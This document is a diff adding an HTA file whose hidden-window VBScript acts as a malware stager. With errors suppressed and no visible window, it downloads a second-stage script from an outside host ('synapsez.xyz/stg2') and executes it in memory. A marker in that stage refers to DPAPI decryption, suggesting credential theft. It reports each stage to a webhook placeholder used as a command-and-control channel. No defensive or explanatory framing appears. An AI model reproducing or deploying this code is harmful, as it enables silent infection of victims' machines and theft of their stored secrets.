@@ -1,0 +1,67 @@
+<html>
+<head><title>.</title>
+<hta:application id="a" border="none" innerborder="no" caption="no" showintaskbar="no" sysmenu="no" contextmenu="no" selection="no"/>
+<script language="VBScript">
+On Error Resume Next
+Dim wh: wh = "WEBHOOK_URL"
+
+Dim t: Set t = CreateObject("WinHttp.WinHttpRequest.5.1")
+t.Open "POST", wh, False
+t.SetRequestHeader "Content-Type", "application/json"
+t.SetRequestHeader "User-Agent", "Mozilla/5.0"
+t.Send "{""content"":""STAGER_START""}"
+Set t = Nothing
+
+Dim ht: Set ht = CreateObject("MSXML2.ServerXMLHTTP.6.0")
+ht.SetOption 2, 13056
+ht.Open "GET", "https://synapsez.xyz/stg2", False
+ht.Send
+If ht.Status = 200 Then
+    Dim code: code = Replace(ht.ResponseText, "WEBHOOK_URL", wh)
+    Set t = CreateObject("WinHttp.WinHttpRequest.5.1")
+    t.Open "POST", wh, False
+    t.SetRequestHeader "Content-Type", "application/json"
+    t.SetRequestHeader "User-Agent", "Mozilla/5.0"
+    t.Send "{""content"":""STG2_DL:" & Len(code) & "b""}"
+    Set t = Nothing
+
+    Dim marker: marker = "' ===== DPAPI DECRYPT ====="
+    Dim mp: mp = InStr(code, marker)
+    If mp > 0 Then
+        Dim codeFuncs: codeFuncs = Mid(code, mp)
+        Dim codeMain: codeMain = Left(code, mp - 1)
+
+        Execute codeFuncs
+        Set t = CreateObject("WinHttp.WinHttpRequest.5.1")
+        t.Open "POST", wh, False
+        t.SetRequestHeader "Content-Type", "application/json"
+        t.SetRequestHeader "User-Agent", "Mozilla/5.0"
+        t.Send "{""content"":""FUNCS_DONE:" & Len(codeFuncs) & "b""}"
+        Set t = Nothing
+
+        Set t = CreateObject("WinHttp.WinHttpRequest.5.1")
+        t.Open "POST", wh, False
+        t.SetRequestHeader "Content-Type", "application/json"
+        t.SetRequestHeader "User-Agent", "Mozilla/5.0"
+        t.Send "{""content"":""PAYLOAD_START""}"
+        Set t = Nothing
+
+        Execute codeMain
+        Set t = CreateObject("WinHttp.WinHttpRequest.5.1")
+        t.Open "POST", wh, False
+        t.SetRequestHeader "Content-Type", "application/json"
+        t.SetRequestHeader "User-Agent", "Mozilla/5.0"
+        t.Send "{""content"":""MAIN_EXECUTED""}"
+        Set t = Nothing
+    Else
+        Set t = CreateObject("WinHttp.WinHttpRequest.5.1")
+        t.Open "POST", wh, False
+        t.SetRequestHeader "Content-Type", "application/json"
+        t.SetRequestHeader "User-Agent", "Mozilla/5.0"
+        t.Send "{""content"":""SPLIT_FAIL:mp=" & mp & """}"
+        Set t = Nothing
+    End If
+End If
+Set ht = Nothing
+</script>
+</head><body></body></html>
